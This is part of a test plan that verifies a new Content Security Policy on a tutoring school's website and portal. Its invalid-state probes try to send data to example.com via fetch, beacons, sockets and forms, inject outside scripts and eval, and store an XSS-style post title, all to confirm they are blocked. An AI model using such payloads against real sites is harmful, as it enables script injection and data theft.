| E-14 | 5.5 | Portal headers | Portal paths and the fallback get only the portal policy, plus noindex and no-store | `hdr` for `/portal`, `/portal/login`, `/portal/login/verify`, `/portal/admin/staff`, `/portal/student`, `/portal/parent`, `/portal/account/two-step/setup`, `/__spa-fallback`; for each also `grep -ci '^x-robots-tag: noindex, nofollow$'` and `grep -ci '^cache-control: no-store$'` on `$SCR/h.txt`. `/portal/` and `/__spa-fallback.html`: `301` and the final response. Record only: `hdr` for `/PORTAL/login` | Every line `200 csp=1 kind=portal-local` (the policy names `challenges.cloudflare.com`; `kind=public-local` never appears); robots **1**, no-store **1** on each. Redirects: `301` → `/portal`, `/__spa-fallback`, each final `csp=1 kind=portal-local`. `/PORTAL/login`: count and kind recorded (on `9de84b3`: `csp=1 kind=portal-local`, served the fallback); its Vercel behaviour is release check 2(f) (ruling 3) | P |
| E-15 | 5.6 | Other headers | The global headers are on every response, once | For every path in E-12 and E-14: `grep -ci` on `$SCR/h.txt` for `^x-content-type-options: nosniff$`, `^x-frame-options: DENY$`, `^referrer-policy: strict-origin-when-cross-origin$`; on the E-12 paths also `^x-robots-tag` | Each **1** on every response. `X-Robots-Tag` **0** on every public page (the mirror drops Railway's global noindex, as Vercel sends none). HSTS: E-09 and release check (non-bug 5) | P |
| E-16 | 5.7 | Railway in step | The committed Railway config sends the same public CSP, unsubstituted | Start **R**: `PORT=4174 pnpm --filter web start:railway &`. `hdr http://127.0.0.1:4174` for `/`, `/programmes/vce`, `/nope`, `/portal`, `/portal/login`, `/__spa-fallback`; `grep -ci '^x-robots-tag'` on each. Stop R (port 4174 free) | `/`, `/programmes/vce`: `200 csp=1 kind=public-hosted`; `/nope` `404 csp=1 kind=public-hosted`; the three portal paths `200 csp=1 kind=portal-hosted`. X-Robots-Tag **1** on every response (Railway's staging noindex, kept in the committed file). No browser opened against R | R |
| E-17 | 5.7, 5.5 | Rule order | Railway's rule order is what keeps the portal on one policy | 1. `jq -r '.headers \| to_entries[] \| "\(.key) \(.value.source) \(.value.headers[-1].key)"' apps/web/serve.railway.json`. 2. `(cd apps/web && node scripts/serve-mirror.ts --write-only $SCR/mirror.json)`; `jq '.headers \|= [.[1], .[0]]' $SCR/mirror.json > $SCR/swapped.json`; `(cd apps/web && node_modules/.bin/serve --config $SCR/swapped.json -l tcp://127.0.0.1:4175 --no-clipboard &)`; `hdr http://127.0.0.1:4175 /portal/login`; stop it. 3. `jq '.headers[0].headers[].key' $SCR/mirror.json`; `jq '.headers[1].headers[].key' $SCR/mirror.json` | 1: `0 **/* Content-Security-Policy` then `1 __spa-fallback.html Cache-Control` (public rule first, its CSP last). 2: on the swapped order `/portal/login` is `csp=1 kind=public-local`: `serve` keeps the last value per key, so the committed order is load-bearing, and E-14 proves it's right. 3: `**/*` has no `X-Robots-Tag`; the fallback keeps it | — |
| E-18 | 5.11 | Guard fails closed (CLI) | `check:hosted-ref` refuses everything that could hide a hosted ref | In `$SCR/g/`: `a/x.js` with the ref; `b/` holding the ref once each in `s.css`, `i.svg`, `r.data`, `m.xml`, `w.webmanifest`, `noext`, plus `p.png` with the ref; `empty/` (no files); `clean/ok.js` without it. Run `node apps/web/scripts/check-hosted-ref.ts <path>; echo $?` for `a`, `b`, `empty`, `clean`, `$SCR/g/nope`, `clean` and `a` together, and with no argument | `a`: `1 files in … contain the hosted project ref` and `1 files (of 1 scanned)`, exit **1**. `b`: `6 files (of 6 scanned)` (`i.svg`, `m.xml`, `noext`, `r.data`, `s.css`, `w.webmanifest`; `p.png` skipped as a known binary type, by design), exit **1**. `empty`: `scanned 0 files` message, exit **1**. `clean`: `0 files (of 1 scanned)`, exit **0**. Missing path: `no such path`, exit **1**. `clean a`: exit **1**. No argument: usage message, exit **1** | — |
| E-19 | 5.11 | Mirror refuses (X4) | The mirror won't serve a build holding the hosted ref | Apply X4. `(cd apps/web && node scripts/serve-mirror.ts --stub-analytics --port 4176); echo $?`; `lsof -nP -iTCP:4176 -sTCP:LISTEN \| wc -l`; `pnpm --filter web check:hosted-ref build/client; echo $?`. Remove X4; `pnpm --filter web check:hosted-ref build/client; echo $?` | Mirror: stderr `serve-mirror: 1 files in … contain the hosted project ref, e.g. zz-hosted-probe.js`, exit **1**; nothing listening on 4176 (**0**). Check: `1 files`, exit **1**. After removal: `0 files`, exit **0**. P (already running) is untouched | P build |

### Phase 3 — public sweep on P (AC-5.3, 5.4, 5.11; item 1's `/posts` under the CSP)

Every leg below follows the console, violation and hosted rules in the header. Unless the case says
otherwise, each leg also expects: status `200` (`/nope` `404`, C1); exactly **1** `h1`; robots meta
**0** on the SITEMAP pages and **1** on `/subscribed` and `/nope` (non-bug 7); overflow **0**;
images ok; the document's `headersArray()` has exactly **1** `content-security-policy`.

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-20 | Smoke | Start-up | P serves the key pages | `/`, `/privacy`, `/portal/login` at 1280 light: load; `h1` text | Three `200`; `h1` present once each; console 0, violations 0, hosted 0 | P |
| E-21 | 5.3, 5.1 | Load and hydration, no posts | Every public page, 360 and 1280, light and dark (64 legs) | For each P16 page × {360, 1280} × {light, dark}: load; wait for hydration (`document.querySelector('header button[aria-controls]')` exists and `window.__reactRouterContext` is set); read the leg counters, `getComputedStyle(document.body).backgroundColor`, the computed `color` and `background-color` of `body`, the `h1` and the header's first link, the marker check (`document.title` starts `[`, and any element whose text starts `STAGING` or `DEV`); screenshot to `$EVD` | **64** legs. Violations **0**, console errors **0** (C1 on the 4 `/nope` legs only), pageerror **0**, hosted **0**, unexpected hosts **0** on every leg. Background `rgb(255, 255, 255)` in light **and** dark (non-bug 3, ruling 4). No contrast loss: on each dark leg, the computed `color` and `background-color` of `body`, the `h1` and the header's first link equal those of the same page's light leg. No environment marker, and the title has no `[` prefix (production build). Plus the defaults above on every leg | P |
| E-22 | 5.3 | Phone menu | The menu opens and closes at 360 on every page (32 legs) | On the 360 legs of E-21: click `Open menu`; read `aria-expanded` and whether `#` + `aria-controls` is visible; click `Close menu`; read again | Opened: `aria-expanded="true"`, the nav visible. Closed: `"false"`, the `Open menu` button back. Violations 0, console 0 (C1 on `/nope`) | P |
| E-23 | 5.3; item 1 AC-1.6/1.7 | News, no posts | With 0 posts, the News link is hidden and `/posts` shows the empty state | From E-21's legs: count `a[href="/posts"]`; the News check request (`127.0.0.1:55321/rest/v1/posts?select=id&limit=1`) count and status per leg. On `/posts`: the status text | `a[href="/posts"]` **0** on every page. The check is sent **once** per page load, status `200`, body `[]`. `/posts` shows `There are no news posts at the moment.` (not the error text), with the two links; 0 list items. Violations 0 | P |
| E-24 | 5.3 | Enquiry (mocked) | The Register Interest form submits under the CSP (4 legs) | On `/` at 360 and 1280, light and dark: fill `#contact-name` (`CSP Sweep`), `#contact-email` (`csp-sweep@example.test`), `#contact-message`; click `Register interest` in `#ask-a-question`; wait for `[role="status"]`. Read the mock hits, the Web3Forms request URL and its body's `access_key`; `q "select count(*) from public.enquiries"` before and after the 4 legs | Each leg: Web3Forms mock **1** hit to `https://api.web3forms.com/submit`, `access_key` `local-placeholder`; `leads` mock **1** hit to `http://127.0.0.1:55321/functions/v1/leads`; the status shows `Message sent` and `Thank you! We've received your details and will be in touch within 3 business days.` Violations 0, console 0. Enquiries delta **0** (nothing reached the local or hosted `leads`) | P, DB |
| E-25 | 5.3 | Subscribe (mocked) | The footer subscribe works under the CSP on every page (64 legs) | On every E-21 leg: fill `footer input[type="email"]` (`csp-sweep@example.test`); click `Subscribe`; read the footer `[role="status"]`; the Kit mock's hit count and URL | Kit mock **1** hit per leg, `POST https://app.convertkit.com/forms/0000000/subscriptions`; status `Almost done! We've sent a confirmation link to csp-sweep@example.test. Please check your inbox, and your spam folder if it's not there.` Violations 0, console 0 (C1 on `/nope`) | P |
| E-26 | 5.3; item 1 AC-1.5, AC-1.14 | Sweep with a post (X1) | With 1 post: the News link, the `/posts` list, and a script-looking title, on every page (64 legs) | Apply X1. Repeat E-21 (all 64 legs, including E-22's menu and E-25's subscribe). Read `header a[href="/posts"]` and `footer a[href="/posts"]` counts; on `/posts`: the list item count, the post's `h2` `textContent`, `document.title`, `document.querySelectorAll('img[src="x"]').length`, dialogs (`page.on('dialog')`) | Every page: header link **1** and footer link **1**, text `News`. The News check `200` with 1 row. `/posts`: **1** list item; `h2` text exactly the stored title, `e2e-item5 <img src=x onerror="document.title='xss'">`, shown as text; `document.title` is the page's own (`Latest News \| AJ Classes`), never `xss`; `img[src="x"]` **0**; dialogs **0**. Violations 0, console 0 (C1), hosted 0 on all 64 | P, DB |
| E-27 | 5.3; item 1 AC-1.7 | News failures (X1 still applied) | A failing or slow database hides the News link and shows the error state, with no violation | Fresh legs at 1280 light: 1. Route `http://127.0.0.1:55321/rest/v1/posts**` → `500`; open `/` and `/posts`. 2. Route it to fulfil `[{"id":"x"}]` after a **6 s** delay (the app's timeout is 5 s); open `/`, wait 8 s. Read links, the `/posts` text, route hit counts. Then remove X1 (§1 table) | 1: `a[href="/posts"]` **0** on both pages; `/posts` shows `We couldn't load the news just now. Please try again later.` 2: link **0** after 8 s. Violations **0**; console only **C3** (one `500` line per route hit in step 1; step 2 recorded). After the delete: `q "select count(*) from public.posts"` = **0** | P, DB |
| E-28 | 5.4 | JSON-LD | Structured data is still in the HTML and parses | For every P16 page: `script[type="application/ld+json"]` count in the loaded DOM; `JSON.parse` each; its `@type` (or `@graph[*].@type`) | **1** block on `/`, each of the 9 programme pages and the guide (**11** pages); **0** on `/privacy`, `/resources`, `/posts`, `/subscribed`, `/nope`. Every block parses; every `@type` recorded. (The Rich Results check is item 6) | P |
| E-29 | 5.4 | Assets | Images, icons and fonts still load; nothing is CSP-blocked | On `/`, `/programmes/vce` and the guide at 1280: images ok (record count); `link[rel~="icon"]` and `link[rel="apple-touch-icon"]` `href`s fetched with `page.request.get` (status, `content-type`); requests of type `font`; `link[rel="manifest"]` count; `meta[property="og:image"]` content; any request to `ajclasses.com.au` | Every image ok (2/2 on `9de84b3`). `/favicon.svg` `200 image/svg+xml`; `/apple-touch-icon.png` `200 image/png`. Font requests **0** and `font-src` violations **0** (system fonts, O1). Manifest link **0** (O1). `og:image` = `https://ajclasses.com.au/og-image.png`, and requests to `ajclasses.com.au` **0** (never fetched by the page; O1). Violations 0, console 0 | P |
| E-30 | 5.4 | WhatsApp | The WhatsApp button still opens `wa.me` | On `/`, `/programmes/vce`, `/nope` at 360 and 1280: read `a[aria-label="Chat with AJ Classes on WhatsApp (opens WhatsApp)"]`'s `href`, `target`, `rel`; click it; wait for the popup; read the popup's URL (the `wa.me/**` mock answers it) | `href` starts `https://wa.me/61469800685?text=`; `target="_blank"`; `rel` contains `noopener`. The popup opens at that URL (6/6). Opener page: violations 0, console 0 (C1 on `/nope`) | P |
| E-31 | 5.4 | Analytics stub | The analytics script loads under the CSP on the mirror (the real one is a live check) | From E-21's legs (excluding `/portalx`, non-bug 8): requests to `/_vercel/insights/*`; their status | Exactly **1** request per page load, `GET /_vercel/insights/script.js`, `200`, and no `script-src` violation for it. The real script and its beacon are release check 3 | P |
| E-32 | 5.11 | No hosted requests (sweep) | The whole public sweep made 0 `supabase.co` requests | Count **request URLs**, not raw HAR text: `jq -r '.log.entries[].request.url' $EVD/har/E-2*.har \| grep -c 'supabase\.co'`; sum the per-leg hosted counters for E-20 to E-31; list the distinct request origins across these HARs | Request URLs with `supabase.co` **0**; hosted total **0**. (Raw `grep` isn't the measure: on portal pages the supabase-js chunk's own response body holds a `*.supabase.co` allow-list literal, dev notes §8; public HARs have none, but the URL count is the intent.) Origins exactly: `http://127.0.0.1:4173`, `http://127.0.0.1:55321`, and the mocked `https://api.web3forms.com`, `https://app.convertkit.com`, `https://wa.me` (record the HAR and request counts) | P |

### Phase 4 — portal on P (AC-5.5 regression)

Sign-in on P: `/portal/login`, `#login-email`, `#login-password` (seed password), wait until the
Turnstile token is present (`input[name="cf-turnstile-response"]` non-empty, ≤ 20 s), click
`Sign in`. Admin two-step: `/portal/login/verify`, `#two-step-code` filled with a TOTP computed from
the seed's local key (the helper's algorithm in `supabase/scripts/local-test-helpers.mjs`).
Expected on every leg unless stated: violations **0**, console **0**, pageerror **0**, hosted **0**,
and every document response has exactly **1** CSP header equal to `$POR_LOCAL`.

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-40 | 5.5 | Admin sign-in with two-step | The admin signs in through Turnstile and two-step under the portal CSP | At 1280 and 360 (light): sign in as `admin@`; enter the TOTP; record each URL and `h1`; reload; record again. Count requests to `challenges.cloudflare.com` and to `127.0.0.1:55321/auth/v1/token` (status); read each document's CSP count and value | Turnstile requests **≥ 1** (it loaded); `auth/v1/token` `200`; `/portal/login/verify` shown; lands on `/portal/admin`, `h1` `Admin`; the same after reload. Document CSP **1**, `portal-local`, on every document. Violations 0, console 0 on both legs | P, DB |
| E-41 | 5.5 | Student and parent home | Family homes load under the portal CSP, light and dark (8 legs) | `student@` and `parent@`, each at 360 and 1280, light and dark (device setting; the portal follows it by default): sign in; record URL and `h1`; read `document.documentElement.dataset.portalTheme`; images ok; reload; record again | `student@` → `/portal/student`; `parent@` → `/portal/parent`; the same page after reload. `portalTheme` `light` on light legs and `dark` on dark legs. Images ok. Defaults above on all 8 | P, DB |
| E-42 | 5.5 | Other roles | Tutor home and the new-admin two-step set-up | `tutor@` at 1280: sign in; URL, `h1`. `newadmin@` at 1280: sign in; URL; the QR `img` (`src` scheme, images ok) | `tutor@` → `/portal/tutor`. `newadmin@` → `/portal/account/two-step/setup`; the QR image is a `data:` URL and loads (allowed by `img-src data:`). Defaults above (E-80 deletes the unverified factor this creates) | P, DB |
| E-43 | 5.5 (edge) | Refused sign-in | The deactivated account is refused, and the page stays clean | `inactive@` with the seed password at 1280 | `Email or password is incorrect.` shown; URL stays `/portal/login`; 0 auth-token keys in `localStorage`. Console: only **C2**. Violations 0, hosted 0 | P, DB |
| E-44 | 5.5 | Avatars (X2) | A stored profile photo loads under the portal CSP | Start **D** (`pnpm dev --port 5173 --strictPort` from `apps/web`, §1 exports); apply X2 on D; stop nothing yet. On P as `admin@` (two-step): `/portal/admin/staff/$TUT`; as `tutor@`: `/portal/profile`. Read `img[src*="/storage/v1/object/public/avatars/"]` count, `src` origin, images ok. Then remove X2 on D; stop D | Both pages: avatar `img` **≥ 1**, `src` starts `http://127.0.0.1:55321/storage/v1/object/public/avatars/`, loaded (`naturalWidth > 0`). Defaults above on both P legs. After the removal: `avatar_path` `null`, avatar objects back to the snapshot; port 5173 free. (Work-file downloads: item 2 is held; its T2.15 re-test covers them, 03b §9) | P, D, DB |
| E-45 | Record only (K1) | Photo preview | Record the pre-existing preview block under the unchanged portal CSP | On P as `tutor@`, `/portal/profile`: Choose a photo → `$SCR/red.png`; **don't** click Use this photo. Read the preview `img`'s `src` scheme, images ok, violations | Recorded, not pass or fail (C5). On `9de84b3`: `blob:` preview, not loaded, one `img-src` violation `blockedURI` `blob`. Nothing is uploaded (`avatar_path` still `null`) | P, DB |

### Phase 5 — invalid states on P (AC-5.8)

All injections run on P's `/` at 1280, in one fresh context per case, with a `https://example.com/**`
route that counts hits and answers `200`. Read the violation events and console lines after each
probe. C4 applies.

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-50 | 5.8 | Unlisted script host | A script from an unlisted host is blocked, and the block shows | `const s = document.createElement('script'); s.src = 'https://example.com/x.js'; document.head.append(s)`; wait 500 ms | Exactly **1** violation, `script-src-elem\|https://example.com/x.js\|enforce`; 1 console line `Loading the script 'https://example.com/x.js' violates the following Content Security Policy directive: "script-src 'self' 'unsafe-inline'"…`. `example.com` route hits **0** (blocked before the network) | P |
| E-51 | 5.8 | Exfiltration and embedding | Each other way out is blocked by its own directive | One probe at a time, reading the new violations after each: `fetch('https://example.com/data')`; `new Image().src='https://example.com/b.gif'` (appended); `navigator.sendBeacon('https://example.com/beacon','x')`; `new WebSocket('wss://example.com/ws')`; `new FontFace('X','url(https://example.com/f.woff2)').load()`; a `<link rel=stylesheet href=https://example.com/s.css>`; an `<iframe src=https://example.com/f>`; an `<iframe src=/privacy>`; an `<object data=https://example.com/o.swf>`; a `<base href=https://example.com/>`; a `<form action=https://example.com/post method=post>` submitted | One violation each, `enforce`, with `effectiveDirective` in order: `connect-src`, `img-src`, `connect-src`, `connect-src`, `font-src`, `style-src-elem`, `frame-src`, `frame-src` (same-origin frames too: `frame-src 'none'`), `object-src`, `base-uri`, `form-action`. `fetch` rejects (`TypeError: Failed to fetch`); `document.baseURI` stays `http://127.0.0.1:4173/`; the page URL stays `/` after the form submit. `example.com` route hits **0**. Console: one refusal line per probe, plus `fetch`'s `Fetch API cannot load…` line; nothing else | P |
| E-52 | 5.8 | `eval` | String-to-code is blocked (no `'unsafe-eval'`) | Inject an inline `<script>` whose body is `setTimeout(function () { try { window.__e = String(eval('1+1')) } catch (e) { window.__e = e.name } try { window.__f = String(new Function('return 2')()) } catch (e) { window.__f = e.name } }, 0)`; wait 300 ms; read `__e`, `__f` (harness note: deferred, not inside `page.evaluate`) | `__e` = `EvalError`, `__f` = `EvalError`; violations `script-src\|eval\|enforce` (**≥ 1**); console lines are only `Evaluating a string as JavaScript violates…`. pageerror **0** (caught) | P |
| E-53 | 5.8 | Inline code runs on purpose | Inline handlers and inline scripts run, as ADR-0005 decision 1 states | Prepend `<button id="csp-x" onclick="document.title='ran'">x</button>`; `page.click('#csp-x')`; read `document.title`. Inject `<script>window.__inl = 1</script>`; read `window.__inl` | Title `ran`; `__inl` = `1`; violations **0**. The TSR records: "inline `onclick` runs on purpose (`'unsafe-inline'`, ADR-0005 decision 1)" | P |
| E-54 | 5.8, 5.2 | Framing (X3) | Another site can't frame a public page | Apply X3. Open `http://127.0.0.1:4177/` at 1280; wait 1.5 s; list `page.frames()` URLs; try to read the child frame's `h1` count. Remove X3 | The child frame isn't the public page (its URL is `chrome-error://chromewebdata/`; no `h1` readable). Console on the framer page: exactly 1 line, `Framing 'http://127.0.0.1:4173/' violates the following Content Security Policy directive: "frame-ancestors 'none'"…` (C4). P's `X-Frame-Options: DENY` is also present (E-15) | P |

### Phase 6 — environment marker on the staging build (AC-5.4)

Stop **P**. Build **PS** with the same gate exports and `VITE_APP_ENV=staging` (inside the §1
subshell), run `check:hosted-ref build/client`, then `pnpm mirror`. Afterwards, stop PS. Nothing
later needs P.

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-60 | 5.4, 5.11 | Staging marker | The environment marker still shows on a non-production build, under the CSP | 1. The PS build's `check:hosted-ref` line; the all-files grep. 2. `hdr http://127.0.0.1:4173` for `/` and `/nope`. 3. Browser: `/`, `/programmes/vce`, `/posts`, `/nope` at 360 and 1280 (light): `document.title`; the element whose text starts `STAGING` (its visible text); `link[rel="icon"]` `href` and its status; robots meta count; requests to `/_vercel/insights/*` | 1: `0 files (of N scanned)`; grep **0**. 2: `/` `200 csp=1 kind=public-local`, `/nope` `404 csp=1 kind=public-local`. 3: on all 8 legs: the title starts `[STAGING] `; the marker label text starts `STAGING`; icon `/favicon-staging.svg`, `200`; robots meta **≤ 1**; analytics requests **0** (off on staging). Violations 0, console 0 (C1 on `/nope`), hosted 0 | PS |

### Phase 7 — docs (AC-5.9, AC-5.10)

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-70 | 5.9 | Item 9 closed in the PRP | The three annotations are there, each with the working link, and the sample is untouched | 1. `grep -c 'item-9--hreflang--geo-head-tags-dropped' docs/requirements/release-1/PRP.md`. 2. `grep -n 'Dropped (26 Oct 2026, pending-requirements item 9)' docs/requirements/release-1/PRP.md`; `grep -n 'except the \`hreflang\` and \`geo.\*\` tags, dropped' …`; `grep -n 'Every tag in F6.3 is present in production HTML (\`hreflang\` and \`geo.\*\` dropped' …`. 3. The link target: `grep -c '^## Item 9 — \`hreflang\` / \`geo.\*\` head tags: \*\*dropped\*\*$' docs/delivery/2026-10-25-pending-requirements/01b-requirement-items-4-9.md`, and its GitHub slug: `node -e "console.log(process.argv[1].toLowerCase().replace(/[^\p{L}\p{N}\s_-]/gu,'').replace(/ /g,'-'))" 'Item 9 — \`hreflang\` / \`geo.*\` head tags: **dropped**'`. 4. `git diff --numstat develop...HEAD -- docs/requirements/release-1/PRP.md`; the line number of the closing ```` ``` ```` of the F6.3 sample vs the "Dropped" line. 5. No code change: `grep -rlE 'hreflang\|geo\.(region\|placename)' apps/web/build/client --include='*.html' \| wc -l`; same on `apps/web/src` | 1: **3**. 2: one hit each (F6.3 sample note, F6.3.1, launch checklist). 3: **1**; slug `item-9--hreflang--geo-head-tags-dropped`. 4: `4 2` (4 lines added, 2 replaced); the "Dropped" line comes **after** the code block's closing fence, so the copyable sample (lines with `hreflang` and `geo.region`/`geo.placename`) is unchanged. 5: **0** and **0** | — |
| E-71 | 5.10 | Architecture doc | `arch.md` lists the hosts and the "update both files" rule | `grep -n 'Public pages send an enforcing CSP (ADR-0005)' docs/architecture/arch.md`; in that paragraph: `unzjnxctkyahtmrkinyr.supabase.co`, `api.web3forms.com`, `app.convertkit.com`, `**both** \`apps/web/vercel.json\` and \`apps/web/serve.railway.json\``, `src/hosting-csp.test.ts` | 1 paragraph; each of the 5 strings found in it. It sits in §3 Hosting (before `**4. Backend`) | — |
| E-72 | 5.1, S1 | Other docs in step | The superseded item 1 line, the ADR amendment and the go-live checks are written | `grep -c 'superseded by item 5' docs/delivery/2026-10-25-pending-requirements/03-design.md`; `grep -c '__spa-fallback\$' docs/decisions/0005-public-csp-static-headers.md`; `grep -n '7c. Public CSP' docs/requirements/release-2/go-live.md`; `grep -c '__spa-fallback \| grep -ci' docs/requirements/release-2/go-live.md` | `1`; **≥ 1**; 1 hit; `1` (the live `/__spa-fallback` count is a release step) | — |

### Phase 8 — close-out

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-80 | All | Data restore | Local data back to the seed; nothing left running; repo clean | `q "delete from auth.mfa_factors where user_id='$NADM' and status='unverified'"`. Re-run E-02 step 4 into `$SCR/snapshot-end.txt`; `diff` against the start (excluding the enquiries line, which E2E changes and cleans itself, and the factor count, compared after the delete); `q "select count(*) from public.posts where title like 'e2e-%'"`; `lsof -nP -iTCP -sTCP:LISTEN \| grep -cE ':(4173\|4174\|4175\|4176\|4177\|5173) '`; `git status --short`; `ls apps/web/build/client/zz-hosted-probe.js 2>&1` | `diff` empty (profiles, posts **0**, avatars, tutor photo `null`, `e2e-%` **0**, factor count as at the start). `e2e-` posts **0**. Ports **0**. `git status` empty (only the TSR and evidence, added by `/test-and-ship`). Probe file absent | DB |
| E-81 | 5.3, 5.11 | Console and hosted totals | Every browser leg was clean | Sum the counters over every leg of E-20 to E-60 (list each leg and its counts in the TSR) | Violations **0**, console errors **0**, pageerror **0** on every leg, except the declared C1 (each 404 leg, 1 line), C2 (E-43, 1 line), C3 (E-27, = route hits), C4 (E-50 to E-54, the measured lines only) and C5 (E-45, recorded). Hosted (`supabase.co`) **0** in total; unexpected hosts **0** | P, PS |

---

## 3. AC → case map

| AC | Cases |
|---|---|
| 5.1 Every public HTML response has an enforcing CSP (404 included); committed files carry the hosted host | E-09, E-11, E-12, E-13, E-21, E-26, E-60, E-72 |
| 5.2 Minimum directives, no wildcard, `'unsafe-inline'` reason written down | E-09, E-10, E-51, E-54 |
| 5.3 Zero violations: load, menu, News with and without posts, `/posts` list and empty, enquiry, subscribe, 360 and 1280 | E-21 to E-27, E-81 |
| 5.4 Nothing breaks: JSON-LD, images, icons, fonts, manifest/OG (O1), WhatsApp, marker, analytics stub | E-06, E-28, E-29, E-30, E-31, E-60 (live analytics: §4 check 3) |
| 5.5 Portal unchanged: one portal CSP, sign-in with Turnstile and two-step, avatars, noindex and no-store | E-09, E-14, E-17, E-40 to E-45 |
| 5.6 Other headers kept | E-09, E-15 (HSTS live: §4 check 2) |
| 5.7 Railway in step, rule order | E-09, E-16, E-17 |
| 5.8 Invalid states: unlisted host blocked and shown; inline `onclick` runs on purpose | E-50 to E-54 |
| 5.9 Item 9 closed in the PRP, no code change | E-70 |
| 5.10 `arch.md` documents the hosts and the "both files" rule | E-71 |
| 5.11 No hosted requests: 0 configured hosted refs, guard fails closed, 0 `supabase.co` requests | E-01, E-05, E-11, E-18, E-19, E-32, E-60, E-81 |
| Item 1 `/posts` under the CSP (T5.10): empty, list, error, slow, script-looking title | E-23, E-26, E-27 |
| Smoke and regression (E2E, admin two-step, student and parent home, tutor, refused sign-in) | E-06, E-20, E-40 to E-43 |
| Safety, scope and code rules | E-01 to E-04, E-07, E-08, E-80 |

**Total: 49 cases** (phase 0: 3, phase 1: 7, phase 2: 9, phase 3: 13, phase 4: 6, phase 5: 5,
phase 6: 1, phase 7: 3, phase 8: 2; E-45 is record only and passes when recorded). The TSR's pass
rate counts every case; BLOCKED counts as not passed.

## 4. Not covered, Saurabh's live checks (release steps, not gate cases)

These need real Vercel. The gate doesn't run them, and doesn't wait for them. They're in
`go-live.md` §7c and 03b §5.8.

1. **Vercel preview, before the merge to `main` (Saurabh only, behind Vercel's login).** Open the
   `develop` preview in Chrome, DevTools → Network, *Preserve log*:
   - (a) the `/` document: exactly **1** `content-security-policy`, the public one;
   - (b) the `/portal/login` document: exactly **1**, the portal one (names
     `challenges.cloudflare.com`), and sign-in still shows the Turnstile check;
   - (c) `/__spa-fallback`: exactly **1**, the portal one;
   - (d) `vercel.live` toolbar violations on the preview are expected. Never add that host.
2. **Live `curl`, after release (team, read-only).** Each prints the count of CSP headers:
   - (a) `curl -sI https://ajclasses.com.au/ | grep -ci '^content-security-policy:'` → `1`, the public one;
   - (b) the same for `/programmes/vce` → `1`, public;
   - (c) the same for `/nope` → `1`, public, on the `404`;
   - (d) `/portal/login` → `1`, the portal one;
   - (e) `/__spa-fallback` → `1`, the portal one, with `X-Robots-Tag: noindex, nofollow` and `Cache-Control: no-store`;
   - (f) `curl -sI https://ajclasses.com.au/PORTAL/login` (ruling 3): exactly `1` CSP and it's the portal one, or the status is `404`. The public CSP there, or 2 CSPs, means revert;
   - (g) `curl -sI https://ajclasses.com.au/ | grep -ci '^strict-transport-security:'` → `1` (AC-5.6).
   If `/portal/*` or `/__spa-fallback` ever shows two CSPs, revert the release (config only).
3. **Vercel Analytics (AC-5.4).** `curl -sI https://ajclasses.com.au/_vercel/insights/script.js` →
   `200`; the live home page in Chrome shows **0** CSP violations for the script and its beacon.
4. **Also not covered here:** browsers other than Chrome (AC-5.3 records "the browser"; dev notes
   D5); the Rich Results test (item 6); work-file downloads under the portal CSP (held item 2,
   T2.15); screen-reader output (no UI change in this item).
